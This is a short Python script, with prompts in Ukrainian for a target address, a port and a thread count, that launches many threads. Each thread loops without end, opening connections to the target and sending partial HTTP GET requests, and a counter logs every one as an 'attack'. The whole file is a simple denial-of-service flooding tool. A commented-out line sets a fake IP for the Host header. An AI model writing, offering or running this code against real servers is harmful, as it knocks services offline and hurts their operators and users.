import socket
import threading

target = input('Введіть адресу-> ')
#fake_ip = '182.21.20.32'
port = int(input('Введіть порт-> '))
k_potokiv=int(input('Введіть кількість потоків->'))

attack_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        #s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(f'Attack_num = {attack_num}\n')

        s.close()

for i in range(k_potokiv):
    thread = threading.Thread(target=attack)
    thread.start()